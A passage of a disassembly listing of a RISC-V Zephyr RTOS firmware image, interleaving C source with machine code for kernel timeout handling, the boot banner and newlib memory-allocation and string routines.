80006082:	3007a073          	csrs	mstatus,a5
	LOCKED(&timeout_lock) {
80006086:	4405                	li	s0,1
80006088:	e00d                	bnez	s0,800060aa <z_set_timeout_expiry+0x5c>
		int next_to = next_timeout();
8000608a:	d8bff0ef          	jal	ra,80005e14 <next_timeout>
			      || (ticks <= next_to);
8000608e:	57fd                	li	a5,-1
80006090:	fef501e3          	beq	a0,a5,80006072 <z_set_timeout_expiry+0x24>
80006094:	fe9540e3          	blt	a0,s1,80006074 <z_set_timeout_expiry+0x26>
80006098:	4405                	li	s0,1
8000609a:	bfe9                	j	80006074 <z_set_timeout_expiry+0x26>
			sys_clock_set_timeout(MIN(ticks, next_to), is_idle);
8000609c:	00a4d363          	bge	s1,a0,800060a2 <z_set_timeout_expiry+0x54>
800060a0:	8526                	mv	a0,s1
800060a2:	85ce                	mv	a1,s3
800060a4:	8d4fe0ef          	jal	ra,80004178 <sys_clock_set_timeout>
800060a8:	bfd9                	j	8000607e <z_set_timeout_expiry+0x30>
		}
	}
}
800060aa:	8000c7b7          	lui	a5,0x8000c
800060ae:	4732                	lw	a4,12(sp)
800060b0:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800060b4:	8fb9                	xor	a5,a5,a4
800060b6:	4701                	li	a4,0
800060b8:	eb81                	bnez	a5,800060c8 <z_set_timeout_expiry+0x7a>
800060ba:	50b2                	lw	ra,44(sp)
800060bc:	5422                	lw	s0,40(sp)
800060be:	5492                	lw	s1,36(sp)
800060c0:	5902                	lw	s2,32(sp)
800060c2:	49f2                	lw	s3,28(sp)
800060c4:	6145                	addi	sp,sp,48
800060c6:	8082                	ret
800060c8:	c2bff0ef          	jal	ra,80005cf2 <_StackCheckHandler>

800060cc <sys_clock_announce>:

void sys_clock_announce(int32_t ticks)
{
800060cc:	1101                	addi	sp,sp,-32
800060ce:	ce06                	sw	ra,28(sp)
800060d0:	cc22                	sw	s0,24(sp)
800060d2:	ca26                	sw	s1,20(sp)
800060d4:	c84a                	sw	s2,16(sp)
800060d6:	842a                	mv	s0,a0
800060d8:	8000c7b7          	lui	a5,0x8000c
800060dc:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800060e0:	c63a                	sw	a4,12(sp)
800060e2:	4701                	li	a4,0
#ifdef CONFIG_TIMESLICING
	z_time_slice(ticks);
800060e4:	bd4ff0ef          	jal	ra,800054b8 <z_time_slice>
	__asm__ volatile ("csrrc %0, mstatus, %1"
800060e8:	300474f3          	csrrci	s1,mstatus,8
		announce_remaining += ticks;
		k_spin_unlock(&timeout_lock, key);
		return;
	}

	announce_remaining = ticks;
800060ec:	800097b7          	lui	a5,0x80009
800060f0:	0487a823          	sw	s0,80(a5) # 80009050 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009051>

	while (first() != NULL && first()->dticks <= announce_remaining) {
800060f4:	a899                	j	8000614a <sys_clock_announce+0x7e>
		struct _timeout *t = first();
		int dt = t->dticks;

		curr_tick += dt;
800060f6:	80009737          	lui	a4,0x80009
800060fa:	41f95593          	srai	a1,s2,0x1f
800060fe:	00872783          	lw	a5,8(a4) # 80009008 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009009>
80006102:	00c72683          	lw	a3,12(a4)
80006106:	01278633          	add	a2,a5,s2
8000610a:	00f637b3          	sltu	a5,a2,a5
8000610e:	96ae                	add	a3,a3,a1
80006110:	97b6                	add	a5,a5,a3
80006112:	00c72423          	sw	a2,8(a4)
80006116:	00f72623          	sw	a5,12(a4)
		t->dticks = 0;
8000611a:	4781                	li	a5,0
8000611c:	4801                	li	a6,0
8000611e:	c81c                	sw	a5,16(s0)
80006120:	01042a23          	sw	a6,20(s0)
		remove_timeout(t);
80006124:	8522                	mv	a0,s0
80006126:	c57ff0ef          	jal	ra,80005d7c <remove_timeout>
			  : "r" (key & MSTATUS_IEN)
8000612a:	88a1                	andi	s1,s1,8
	__asm__ volatile ("csrs mstatus, %0"
8000612c:	3004a073          	csrs	mstatus,s1

		k_spin_unlock(&timeout_lock, key);
		t->fn(t);
80006130:	441c                	lw	a5,8(s0)
80006132:	8522                	mv	a0,s0
80006134:	9782                	jalr	a5
	__asm__ volatile ("csrrc %0, mstatus, %1"
80006136:	300474f3          	csrrci	s1,mstatus,8
		key = k_spin_lock(&timeout_lock);
		announce_remaining -= dt;
8000613a:	80009737          	lui	a4,0x80009
8000613e:	05072783          	lw	a5,80(a4) # 80009050 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009051>
80006142:	412787b3          	sub	a5,a5,s2
80006146:	04f72823          	sw	a5,80(a4)
	while (first() != NULL && first()->dticks <= announce_remaining) {
8000614a:	bbfff0ef          	jal	ra,80005d08 <first>
8000614e:	842a                	mv	s0,a0
80006150:	c105                	beqz	a0,80006170 <sys_clock_announce+0xa4>
80006152:	01052903          	lw	s2,16(a0) # 80000010 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80000011>
80006156:	4958                	lw	a4,20(a0)
80006158:	800097b7          	lui	a5,0x80009
8000615c:	0507a683          	lw	a3,80(a5) # 80009050 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009051>
80006160:	41f6d793          	srai	a5,a3,0x1f
80006164:	00e7c663          	blt	a5,a4,80006170 <sys_clock_announce+0xa4>
80006168:	f8f717e3          	bne	a4,a5,800060f6 <sys_clock_announce+0x2a>
8000616c:	f926f5e3          	bgeu	a3,s2,800060f6 <sys_clock_announce+0x2a>
	}

	if (first() != NULL) {
80006170:	c00d                	beqz	s0,80006192 <sys_clock_announce+0xc6>
		first()->dticks -= announce_remaining;
80006172:	4814                	lw	a3,16(s0)
80006174:	485c                	lw	a5,20(s0)
80006176:	80009737          	lui	a4,0x80009
8000617a:	05072703          	lw	a4,80(a4) # 80009050 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009051>
8000617e:	41f75613          	srai	a2,a4,0x1f
80006182:	40e68733          	sub	a4,a3,a4
80006186:	00e6b6b3          	sltu	a3,a3,a4
8000618a:	8f91                	sub	a5,a5,a2
8000618c:	8f95                	sub	a5,a5,a3
8000618e:	c818                	sw	a4,16(s0)
80006190:	c85c                	sw	a5,20(s0)
	}

	curr_tick += announce_remaining;
80006192:	800096b7          	lui	a3,0x80009
80006196:	800095b7          	lui	a1,0x80009
8000619a:	0505a703          	lw	a4,80(a1) # 80009050 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009051>
8000619e:	41f75513          	srai	a0,a4,0x1f
800061a2:	0086a783          	lw	a5,8(a3) # 80009008 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009009>
800061a6:	00c6a603          	lw	a2,12(a3)
800061aa:	973e                	add	a4,a4,a5
800061ac:	00f737b3          	sltu	a5,a4,a5
800061b0:	962a                	add	a2,a2,a0
800061b2:	97b2                	add	a5,a5,a2
800061b4:	00e6a423          	sw	a4,8(a3)
800061b8:	00f6a623          	sw	a5,12(a3)
	announce_remaining = 0;
800061bc:	0405a823          	sw	zero,80(a1)

	sys_clock_set_timeout(next_timeout(), false);
800061c0:	c55ff0ef          	jal	ra,80005e14 <next_timeout>
800061c4:	4581                	li	a1,0
800061c6:	fb3fd0ef          	jal	ra,80004178 <sys_clock_set_timeout>
			  : "r" (key & MSTATUS_IEN)
800061ca:	88a1                	andi	s1,s1,8
	__asm__ volatile ("csrs mstatus, %0"
800061cc:	3004a073          	csrs	mstatus,s1

	k_spin_unlock(&timeout_lock, key);
}
800061d0:	8000c7b7          	lui	a5,0x8000c
800061d4:	4732                	lw	a4,12(sp)
800061d6:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800061da:	8fb9                	xor	a5,a5,a4
800061dc:	4701                	li	a4,0
800061de:	e799                	bnez	a5,800061ec <sys_clock_announce+0x120>
800061e0:	40f2                	lw	ra,28(sp)
800061e2:	4462                	lw	s0,24(sp)
800061e4:	44d2                	lw	s1,20(sp)
800061e6:	4942                	lw	s2,16(sp)
800061e8:	6105                	addi	sp,sp,32
800061ea:	8082                	ret
800061ec:	b07ff0ef          	jal	ra,80005cf2 <_StackCheckHandler>

800061f0 <boot_banner>:
#define BOOT_DELAY_BANNER ""
#endif

#if defined(CONFIG_BOOT_DELAY) || CONFIG_BOOT_DELAY > 0
void boot_banner(void)
{
800061f0:	1101                	addi	sp,sp,-32
800061f2:	ce06                	sw	ra,28(sp)
800061f4:	cc22                	sw	s0,24(sp)
800061f6:	8000c437          	lui	s0,0x8000c
800061fa:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800061fe:	c63e                	sw	a5,12(sp)
80006200:	4781                	li	a5,0
		k_busy_wait(CONFIG_BOOT_DELAY * USEC_PER_MSEC);
	}

#if defined(CONFIG_BOOT_BANNER)
#ifdef BUILD_VERSION
	printk("*** Booting Zephyr OS build %s %s ***\n",
80006202:	80007637          	lui	a2,0x80007
80006206:	48060613          	addi	a2,a2,1152 # 80007480 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007481>
8000620a:	800085b7          	lui	a1,0x80008
8000620e:	0a058593          	addi	a1,a1,160 # 800080a0 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800080a1>
80006212:	80008537          	lui	a0,0x80008
80006216:	0c050513          	addi	a0,a0,192 # 800080c0 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800080c1>
8000621a:	9b6fc0ef          	jal	ra,800023d0 <printk>
#else
	printk("*** Booting Zephyr OS version %s %s ***\n",
	       KERNEL_VERSION_STRING, BOOT_DELAY_BANNER);
#endif
#endif
}
8000621e:	4732                	lw	a4,12(sp)
80006220:	95042783          	lw	a5,-1712(s0)
80006224:	8fb9                	xor	a5,a5,a4
80006226:	4701                	li	a4,0
80006228:	e789                	bnez	a5,80006232 <boot_banner+0x42>
8000622a:	40f2                	lw	ra,28(sp)
8000622c:	4462                	lw	s0,24(sp)
8000622e:	6105                	addi	sp,sp,32
80006230:	8082                	ret
80006232:	ac1ff0ef          	jal	ra,80005cf2 <_StackCheckHandler>

80006236 <_OffsetAbsSyms>:
/*
 * The final link step uses the symbol _OffsetAbsSyms to force the linkage of
 * offsets.o into the ELF image.
 */

GEN_ABS_SYM_BEGIN(_OffsetAbsSyms)
80006236:	1101                	addi	sp,sp,-32
80006238:	ce06                	sw	ra,28(sp)
8000623a:	8000c7b7          	lui	a5,0x8000c
8000623e:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80006242:	c63a                	sw	a4,12(sp)
80006244:	4701                	li	a4,0
GEN_SOC_OFFSET_SYMS();
#endif

GEN_ABSOLUTE_SYM(__z_arch_esf_t_SIZEOF, sizeof(z_arch_esf_t));

GEN_ABS_SYM_END
80006246:	4732                	lw	a4,12(sp)
80006248:	9507a783          	lw	a5,-1712(a5)
8000624c:	8fb9                	xor	a5,a5,a4
8000624e:	4701                	li	a4,0
80006250:	e781                	bnez	a5,80006258 <_OffsetAbsSyms+0x22>
80006252:	40f2                	lw	ra,28(sp)
80006254:	6105                	addi	sp,sp,32
80006256:	8082                	ret
80006258:	a9bff0ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000625c <exit>:
8000625c:	1141                	addi	sp,sp,-16
8000625e:	c422                	sw	s0,8(sp)
80006260:	c606                	sw	ra,12(sp)
80006262:	00000793          	li	a5,0
80006266:	842a                	mv	s0,a0
80006268:	c791                	beqz	a5,80006274 <exit+0x18>
8000626a:	4581                	li	a1,0
8000626c:	00000097          	auipc	ra,0x0
80006270:	000000e7          	jalr	zero # 0 <CONFIG_2ND_LVL_INTR_01_OFFSET>
80006274:	800077b7          	lui	a5,0x80007
80006278:	11c7a503          	lw	a0,284(a5) # 8000711c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000711d>
8000627c:	551c                	lw	a5,40(a0)
8000627e:	c391                	beqz	a5,80006282 <exit+0x26>
80006280:	9782                	jalr	a5
80006282:	8522                	mv	a0,s0
80006284:	d94fd0ef          	jal	ra,80003818 <_exit>

80006288 <malloc>:
80006288:	85aa                	mv	a1,a0
8000628a:	82c1a503          	lw	a0,-2004(gp) # 8000c014 <_impure_ptr>
8000628e:	a055                	j	80006332 <_malloc_r>

80006290 <_free_r>:
80006290:	c1c5                	beqz	a1,80006330 <_free_r+0xa0>
80006292:	ffc5a783          	lw	a5,-4(a1)
80006296:	1101                	addi	sp,sp,-32
80006298:	cc22                	sw	s0,24(sp)
8000629a:	ce06                	sw	ra,28(sp)
8000629c:	ffc58413          	addi	s0,a1,-4
800062a0:	0007d363          	bgez	a5,800062a6 <_free_r+0x16>
800062a4:	943e                	add	s0,s0,a5
800062a6:	c62a                	sw	a0,12(sp)
800062a8:	2969                	jal	80006742 <__malloc_lock>
800062aa:	80009737          	lui	a4,0x80009
800062ae:	05872783          	lw	a5,88(a4) # 80009058 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009059>
800062b2:	4532                	lw	a0,12(sp)
800062b4:	eb89                	bnez	a5,800062c6 <_free_r+0x36>
800062b6:	00042223          	sw	zero,4(s0)
800062ba:	04872c23          	sw	s0,88(a4)
800062be:	4462                	lw	s0,24(sp)
800062c0:	40f2                	lw	ra,28(sp)
800062c2:	6105                	addi	sp,sp,32
800062c4:	a159                	j	8000674a <__malloc_unlock>
800062c6:	00f47d63          	bgeu	s0,a5,800062e0 <_free_r+0x50>
800062ca:	4010                	lw	a2,0(s0)
800062cc:	00c406b3          	add	a3,s0,a2
800062d0:	00d79663          	bne	a5,a3,800062dc <_free_r+0x4c>
800062d4:	4394                	lw	a3,0(a5)
800062d6:	43dc                	lw	a5,4(a5)
800062d8:	96b2                	add	a3,a3,a2
800062da:	c014                	sw	a3,0(s0)
800062dc:	c05c                	sw	a5,4(s0)
800062de:	bff1                	j	800062ba <_free_r+0x2a>
800062e0:	873e                	mv	a4,a5
800062e2:	43dc                	lw	a5,4(a5)
800062e4:	c399                	beqz	a5,800062ea <_free_r+0x5a>
800062e6:	fef47de3          	bgeu	s0,a5,800062e0 <_free_r+0x50>
800062ea:	4314                	lw	a3,0(a4)
800062ec:	00d70633          	add	a2,a4,a3
800062f0:	00861f63          	bne	a2,s0,8000630e <_free_r+0x7e>
800062f4:	4010                	lw	a2,0(s0)
800062f6:	96b2                	add	a3,a3,a2
800062f8:	c314                	sw	a3,0(a4)
800062fa:	00d70633          	add	a2,a4,a3
800062fe:	fcc790e3          	bne	a5,a2,800062be <_free_r+0x2e>
80006302:	4390                	lw	a2,0(a5)
80006304:	43dc                	lw	a5,4(a5)
80006306:	96b2                	add	a3,a3,a2
80006308:	c314                	sw	a3,0(a4)
8000630a:	c35c                	sw	a5,4(a4)
8000630c:	bf4d                	j	800062be <_free_r+0x2e>
8000630e:	00c47563          	bgeu	s0,a2,80006318 <_free_r+0x88>
80006312:	47b1                	li	a5,12
80006314:	c11c                	sw	a5,0(a0)
80006316:	b765                	j	800062be <_free_r+0x2e>
80006318:	4010                	lw	a2,0(s0)
8000631a:	00c406b3          	add	a3,s0,a2
8000631e:	00d79663          	bne	a5,a3,8000632a <_free_r+0x9a>
80006322:	4394                	lw	a3,0(a5)
80006324:	43dc                	lw	a5,4(a5)
80006326:	96b2                	add	a3,a3,a2
80006328:	c014                	sw	a3,0(s0)
8000632a:	c05c                	sw	a5,4(s0)
8000632c:	c340                	sw	s0,4(a4)
8000632e:	bf41                	j	800062be <_free_r+0x2e>
80006330:	8082                	ret

80006332 <_malloc_r>:
80006332:	1101                	addi	sp,sp,-32
80006334:	ca26                	sw	s1,20(sp)
80006336:	00358493          	addi	s1,a1,3
8000633a:	98f1                	andi	s1,s1,-4
8000633c:	c84a                	sw	s2,16(sp)
8000633e:	ce06                	sw	ra,28(sp)
80006340:	cc22                	sw	s0,24(sp)
80006342:	c64e                	sw	s3,12(sp)
80006344:	04a1                	addi	s1,s1,8
80006346:	47b1                	li	a5,12
80006348:	892a                	mv	s2,a0
8000634a:	04f4f363          	bgeu	s1,a5,80006390 <_malloc_r+0x5e>
8000634e:	44b1                	li	s1,12
80006350:	04b4e263          	bltu	s1,a1,80006394 <_malloc_r+0x62>
80006354:	854a                	mv	a0,s2
80006356:	26f5                	jal	80006742 <__malloc_lock>
80006358:	800096b7          	lui	a3,0x80009
8000635c:	0586a703          	lw	a4,88(a3) # 80009058 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009059>
80006360:	843a                	mv	s0,a4
80006362:	e421                	bnez	s0,800063aa <_malloc_r+0x78>
80006364:	80009437          	lui	s0,0x80009
80006368:	05442783          	lw	a5,84(s0) # 80009054 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009055>
8000636c:	e791                	bnez	a5,80006378 <_malloc_r+0x46>
8000636e:	4581                	li	a1,0
80006370:	854a                	mv	a0,s2
80006372:	2861                	jal	8000640a <_sbrk_r>
80006374:	04a42a23          	sw	a0,84(s0)
80006378:	85a6                	mv	a1,s1
8000637a:	854a                	mv	a0,s2
8000637c:	2079                	jal	8000640a <_sbrk_r>
8000637e:	59fd                	li	s3,-1
80006380:	07351963          	bne	a0,s3,800063f2 <_malloc_r+0xc0>
80006384:	47b1                	li	a5,12
80006386:	00f92023          	sw	a5,0(s2)
8000638a:	854a                	mv	a0,s2
8000638c:	2e7d                	jal	8000674a <__malloc_unlock>
8000638e:	a031                	j	8000639a <_malloc_r+0x68>
80006390:	fc04d0e3          	bgez	s1,80006350 <_malloc_r+0x1e>
80006394:	47b1                	li	a5,12
80006396:	00f92023          	sw	a5,0(s2)
8000639a:	4501                	li	a0,0
8000639c:	40f2                	lw	ra,28(sp)
8000639e:	4462                	lw	s0,24(sp)
800063a0:	44d2                	lw	s1,20(sp)
800063a2:	4942                	lw	s2,16(sp)
800063a4:	49b2                	lw	s3,12(sp)
800063a6:	6105                	addi	sp,sp,32
800063a8:	8082                	ret
800063aa:	401c                	lw	a5,0(s0)
800063ac:	8f85                	sub	a5,a5,s1
800063ae:	0207cf63          	bltz	a5,800063ec <_malloc_r+0xba>
800063b2:	462d                	li	a2,11
800063b4:	00f67663          	bgeu	a2,a5,800063c0 <_malloc_r+0x8e>
800063b8:	c01c                	sw	a5,0(s0)
800063ba:	943e                	add	s0,s0,a5
800063bc:	c004                	sw	s1,0(s0)
800063be:	a031                	j	800063ca <_malloc_r+0x98>
800063c0:	405c                	lw	a5,4(s0)
800063c2:	02871363          	bne	a4,s0,800063e8 <_malloc_r+0xb6>
800063c6:	04f6ac23          	sw	a5,88(a3)
800063ca:	854a                	mv	a0,s2
800063cc:	2ebd                	jal	8000674a <__malloc_unlock>
800063ce:	00b40513          	addi	a0,s0,11
800063d2:	00440793          	addi	a5,s0,4
800063d6:	9961                	andi	a0,a0,-8
800063d8:	40f50733          	sub	a4,a0,a5
800063dc:	fcf500e3          	beq	a0,a5,8000639c <_malloc_r+0x6a>
800063e0:	943a                	add	s0,s0,a4
800063e2:	8f89                	sub	a5,a5,a0
800063e4:	c01c                	sw	a5,0(s0)
800063e6:	bf5d                	j	8000639c <_malloc_r+0x6a>
800063e8:	c35c                	sw	a5,4(a4)
800063ea:	b7c5                	j	800063ca <_malloc_r+0x98>
800063ec:	8722                	mv	a4,s0
800063ee:	4040                	lw	s0,4(s0)
800063f0:	bf8d                	j	80006362 <_malloc_r+0x30>
800063f2:	00350413          	addi	s0,a0,3
800063f6:	9871                	andi	s0,s0,-4
800063f8:	fc8502e3          	beq	a0,s0,800063bc <_malloc_r+0x8a>
800063fc:	40a405b3          	sub	a1,s0,a0
80006400:	854a                	mv	a0,s2
80006402:	2021                	jal	8000640a <_sbrk_r>
80006404:	fb351ce3          	bne	a0,s3,800063bc <_malloc_r+0x8a>
80006408:	bfb5                	j	80006384 <_malloc_r+0x52>

8000640a <_sbrk_r>:
8000640a:	1141                	addi	sp,sp,-16
8000640c:	c422                	sw	s0,8(sp)
8000640e:	c226                	sw	s1,4(sp)
80006410:	842a                	mv	s0,a0
80006412:	800094b7          	lui	s1,0x80009
80006416:	852e                	mv	a0,a1
80006418:	c606                	sw	ra,12(sp)
8000641a:	0404ae23          	sw	zero,92(s1) # 8000905c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000905d>
8000641e:	c1afd0ef          	jal	ra,80003838 <_sbrk>
80006422:	57fd                	li	a5,-1
80006424:	00f51663          	bne	a0,a5,80006430 <_sbrk_r+0x26>
80006428:	05c4a783          	lw	a5,92(s1)
8000642c:	c391                	beqz	a5,80006430 <_sbrk_r+0x26>
8000642e:	c01c                	sw	a5,0(s0)
80006430:	40b2                	lw	ra,12(sp)
80006432:	4422                	lw	s0,8(sp)
80006434:	4492                	lw	s1,4(sp)
80006436:	0141                	addi	sp,sp,16
80006438:	8082                	ret

8000643a <sniprintf>:
8000643a:	7135                	addi	sp,sp,-160
8000643c:	daa6                	sw	s1,116(sp)
8000643e:	cb3e                	sw	a5,148(sp)
80006440:	de86                	sw	ra,124(sp)
80006442:	dca2                	sw	s0,120(sp)
80006444:	d8ca                	sw	s2,112(sp)
80006446:	c736                	sw	a3,140(sp)
80006448:	c93a                	sw	a4,144(sp)
8000644a:	cd42                	sw	a6,152(sp)
8000644c:	cf46                	sw	a7,156(sp)
8000644e:	82c1a483          	lw	s1,-2004(gp) # 8000c014 <_impure_ptr>
80006452:	0005dc63          	bgez	a1,8000646a <sniprintf+0x30>
80006456:	08b00793          	li	a5,139
8000645a:	c09c                	sw	a5,0(s1)
8000645c:	557d                	li	a0,-1
8000645e:	50f6                	lw	ra,124(sp)
80006460:	5466                	lw	s0,120(sp)
80006462:	54d6                	lw	s1,116(sp)
80006464:	5946                	lw	s2,112(sp)
80006466:	610d                	addi	sp,sp,160
80006468:	8082                	ret
8000646a:	20800793          	li	a5,520
8000646e:	00f11a23          	sh	a5,20(sp)
80006472:	c42a                	sw	a0,8(sp)
80006474:	cc2a                	sw	a0,24(sp)
80006476:	842e                	mv	s0,a1
80006478:	4781                	li	a5,0
8000647a:	c199                	beqz	a1,80006480 <sniprintf+0x46>
8000647c:	fff58793          	addi	a5,a1,-1
80006480:	597d                	li	s2,-1
80006482:	0174                	addi	a3,sp,140
80006484:	002c                	addi	a1,sp,8
80006486:	8526                	mv	a0,s1
80006488:	c83e                	sw	a5,16(sp)
8000648a:	ce3e                	sw	a5,28(sp)
8000648c:	01211b23          	sh	s2,22(sp)
80006490:	c236                	sw	a3,4(sp)
80006492:	266d                	jal	8000683c <_svfiprintf_r>
80006494:	01255563          	bge	a0,s2,8000649e <sniprintf+0x64>
80006498:	08b00793          	li	a5,139
8000649c:	c09c                	sw	a5,0(s1)
8000649e:	d061                	beqz	s0,8000645e <sniprintf+0x24>
800064a0:	47a2                	lw	a5,8(sp)
800064a2:	00078023          	sb	zero,0(a5)
800064a6:	bf65                	j	8000645e <sniprintf+0x24>

800064a8 <strcat>:
800064a8:	87aa                	mv	a5,a0
800064aa:	0007c683          	lbu	a3,0(a5)
800064ae:	873e                	mv	a4,a5
800064b0:	0785                	addi	a5,a5,1
800064b2:	fee5                	bnez	a3,800064aa <strcat+0x2>
800064b4:	0005c783          	lbu	a5,0(a1)
800064b8:	0585                	addi	a1,a1,1
800064ba:	0705                	addi	a4,a4,1
800064bc:	fef70fa3          	sb	a5,-1(a4)
800064c0:	fbf5                	bnez	a5,800064b4 <strcat+0xc>
800064c2:	8082                	ret

800064c4 <__strcat_chk>:
800064c4:	872a                	mv	a4,a0
800064c6:	00074783          	lbu	a5,0(a4)
800064ca:	ef91                	bnez	a5,800064e6 <__strcat_chk+0x22>
800064cc:	00f586b3          	add	a3,a1,a5
800064d0:	0006c803          	lbu	a6,0(a3)
800064d4:	00f706b3          	add	a3,a4,a5
800064d8:	00081f63          	bnez	a6,800064f6 <__strcat_chk+0x32>
800064dc:	00f60663          	beq	a2,a5,800064e8 <__strcat_chk+0x24>
800064e0:	00068023          	sb	zero,0(a3)
800064e4:	8082                	ret
800064e6:	e609                	bnez	a2,800064f0 <__strcat_chk+0x2c>
800064e8:	1141                	addi	sp,sp,-16
800064ea:	c606                	sw	ra,12(sp)
800064ec:	c02fd0ef          	jal	ra,800038ee <__chk_fail>
800064f0:	0705                	addi	a4,a4,1
800064f2:	167d                	addi	a2,a2,-1
800064f4:	bfc9                	j	800064c6 <__strcat_chk+0x2>
800064f6:	fec789e3          	beq	a5,a2,800064e8 <__strcat_chk+0x24>
800064fa:	01068023          	sb	a6,0(a3)
800064fe:	0785                	addi	a5,a5,1
80006500:	b7f1                	j	800064cc <__strcat_chk+0x8>

80006502 <strcpy>:
80006502:	87aa                	mv	a5,a0
80006504:	0005c703          	lbu	a4,0(a1)
80006508:	0785                	addi	a5,a5,1
8000650a:	0585                	addi	a1,a1,1
8000650c:	fee78fa3          	sb	a4,-1(a5)
80006510:	fb75                	bnez	a4,80006504 <strcpy+0x2>
80006512:	8082                	ret

80006514 <__strcpy_chk>:
80006514:	1101                	addi	sp,sp,-32
80006516:	cc22                	sw	s0,24(sp)
80006518:	842a                	mv	s0,a0
8000651a:	852e                	mv	a0,a1
8000651c:	ca26                	sw	s1,20(sp)
8000651e:	c62e                	sw	a1,12(sp)
80006520:	84b2                	mv	s1,a2
80006522:	ce06                	sw	ra,28(sp)
80006524:	281d                	jal	8000655a <strlen>
80006526:	00150613          	addi	a2,a0,1
8000652a:	45b2                	lw	a1,12(sp)
8000652c:	00c4f463          	bgeu	s1,a2,80006534 <__strcpy_chk+0x20>
80006530:	bbefd0ef          	jal	ra,800038ee <__chk_fail>
80006534:	00b46863          	bltu	s0,a1,80006544 <__strcpy_chk+0x30>
80006538:	00c587b3          	add	a5,a1,a2
8000653c:	fef46ae3          	bltu	s0,a5,80006530 <__strcpy_chk+0x1c>
80006540:	00859663          	bne	a1,s0,8000654c <__strcpy_chk+0x38>
80006544:	00c407b3          	add	a5,s0,a2
80006548:	fef5e4e3          	bltu	a1,a5,80006530 <__strcpy_chk+0x1c>
8000654c:	8522                	mv	a0,s0
8000654e:	4462                	lw	s0,24(sp)
80006550:	40f2                	lw	ra,28(sp)
80006552:	44d2                	lw	s1,20(sp)
80006554:	6105                	addi	sp,sp,32
80006556:	a98fa06f          	j	800007ee <memcpy>

8000655a <strlen>:
8000655a:	87aa                	mv	a5,a0
8000655c:	0007c703          	lbu	a4,0(a5)
80006560:	0785                	addi	a5,a5,1
80006562:	ff6d                	bnez	a4,8000655c <strlen+0x2>
80006564:	40a78533          	sub	a0,a5,a0
80006568:	157d                	addi	a0,a0,-1
8000656a:	8082                	ret

8000656c <strncat>:
8000656c:	87aa                	mv	a5,a0
8000656e:	0007c703          	lbu	a4,0(a5)
80006572:	e709                	bnez	a4,8000657c <strncat+0x10>
80006574:	fff60713          	addi	a4,a2,-1
80006578:	e611                	bnez	a2,80006584 <strncat+0x18>
8000657a:	8082                	ret
8000657c:	0785                	addi	a5,a5,1
8000657e:	bfc5                	j	8000656e <strncat+0x2>
80006580:	cb11                	beqz	a4,80006594 <strncat+0x28>
80006582:	177d                	addi	a4,a4,-1
80006584:	0005c683          	lbu	a3,0(a1)
80006588:	0585                	addi	a1,a1,1
8000658a:	0785                	addi	a5,a5,1
8000658c:	fed78fa3          	sb	a3,-1(a5)
80006590:	fae5                	bnez	a3,80006580 <strncat+0x14>
80006592:	8082                	ret
80006594:	00078023          	sb	zero,0(a5)
80006598:	8082                	ret

8000659a <__strncat_chk>:
8000659a:	c231                	beqz	a2,800065de <__strncat_chk+0x44>
8000659c:	87aa                	mv	a5,a0
8000659e:	00c6f963          	bgeu	a3,a2,800065b0 <__strncat_chk+0x16>
800065a2:	1141                	addi	sp,sp,-16
800065a4:	c606                	sw	ra,12(sp)
800065a6:	b48fd0ef          	jal	ra,800038ee <__chk_fail>
800065aa:	dee5                	beqz	a3,800065a2 <__strncat_chk+0x8>
800065ac:	0785                	addi	a5,a5,1
800065ae:	16fd                	addi	a3,a3,-1
800065b0:	0007c703          	lbu	a4,0(a5)
800065b4:	fb7d                	bnez	a4,800065aa <__strncat_chk+0x10>
800065b6:	8836                	mv	a6,a3
800065b8:	00e588b3          	add	a7,a1,a4
800065bc:	0008c883          	lbu	a7,0(a7)
800065c0:	01178023          	sb	a7,0(a5)
800065c4:	00088963          	beqz	a7,800065d6 <__strncat_chk+0x3c>
800065c8:	187d                	addi	a6,a6,-1
800065ca:	fcd70ce3          	beq	a4,a3,800065a2 <__strncat_chk+0x8>
800065ce:	0705                	addi	a4,a4,1
800065d0:	0785                	addi	a5,a5,1
800065d2:	fee613e3          	bne	a2,a4,800065b8 <__strncat_chk+0x1e>
800065d6:	fc0806e3          	beqz	a6,800065a2 <__strncat_chk+0x8>
800065da:	00078023          	sb	zero,0(a5)
800065de:	8082                	ret

800065e0 <strncpy>:
800065e0:	87aa                	mv	a5,a0
800065e2:	ca09                	beqz	a2,800065f4 <strncpy+0x14>
800065e4:	0005c703          	lbu	a4,0(a1)
800065e8:	0585                	addi	a1,a1,1
800065ea:	0785                	addi	a5,a5,1
800065ec:	fee78fa3          	sb	a4,-1(a5)
800065f0:	167d                	addi	a2,a2,-1
800065f2:	fb65                	bnez	a4,800065e2 <strncpy+0x2>
800065f4:	963e                	add	a2,a2,a5
800065f6:	00c79363          	bne	a5,a2,800065fc <strncpy+0x1c>
800065fa:	8082                	ret
800065fc:	0785                	addi	a5,a5,1
800065fe:	fe078fa3          	sb	zero,-1(a5)
80006602:	bfd5                	j	800065f6 <strncpy+0x16>

80006604 <strnlen>:
